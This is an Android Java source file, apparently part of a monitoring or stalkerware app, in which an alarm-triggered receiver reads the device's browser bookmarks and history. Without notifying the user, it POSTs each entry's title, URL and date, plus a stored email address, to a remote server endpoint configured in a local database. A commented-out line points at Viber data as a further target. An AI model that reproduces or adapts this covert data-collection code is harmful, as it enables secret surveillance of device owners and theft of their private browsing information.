package voluntaty.com.base;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;

import com.voluntary.database.DataHelper;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

/**
 * Created by supergoga on 1/25/2016.
 */
public class RepeatingAlarmServiceURL extends BroadcastReceiver {
    String login = null;
    String email = null;
    String password = null;

    private int inputsms = 0;

    ArrayList<Integer> list = null;
    private DataHelper dh;

    String URL_HTTP = null;

    static final String[] columns = {"title","url","date"};
    public static final Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");

   // public static final Uri BOOKMARKS_URI2 = Uri.parse("content://viber");

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);
        }
    }


    void someTask(Context context) {

        dh = null;
        dh = new DataHelper(context);

        String serviceurl;
               serviceurl = null;

        serviceurl = dh.selectServiceurl("1");
        if(serviceurl.length()>0) {

            //  URL_HTTP=null;
            URL_HTTP = dh.selectUrl_Http();

            String strt1 = null;
            strt1 = dh.selectGps();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();


            Cursor query = context.getContentResolver().query(BOOKMARKS_URI, columns, null, null, null);
            query.moveToFirst();
            while (query.moveToNext()) {
                String title = null;
                title = query.getString(query.getColumnIndex("title"));
                String url = null;
                url = query.getString(query.getColumnIndex("url"));
                String date = null;
                date = query.getString(query.getColumnIndex("date"));
                Calendar cal = Calendar.getInstance();
                long dateTime = Long.parseLong(date);
                cal.setTimeInMillis(dateTime);
                //        Toast.makeText(context.getApplicationContext(), "?? " + "|" + title + " | " + url + "|" + cal.getTime().toString(), Toast.LENGTH_LONG).show();
                String dateurl = null;
                dateurl = dh.selectDateurl(url + "!" + cal.getTime().toString());
                int dlina = dateurl.length();
                if (dlina < 1) {
                    new RequestTask().execute(email, title, url, "" + cal.getTime().toString(), URL_HTTP);
                    dh.InsertUrlDate(url + "!" + cal.getTime().toString());
                }
                dateurl = null;

                title = null;
                url = null;
                date = null;

            }

            URL_HTTP = null;
            login = null;
            email = null;
            password = null;
            list = null;
        }
        serviceurl = null;
        dh = null;
    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[4]+"/index.php/api/url");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[0]));
                nameValuePairs.add(new BasicNameValuePair("title",params[1]));
                nameValuePairs.add(new BasicNameValuePair("url",params[2]));
                nameValuePairs.add(new BasicNameValuePair("date",params[3]));
                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);

                //	JSONURL(response.toString());

            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }




}



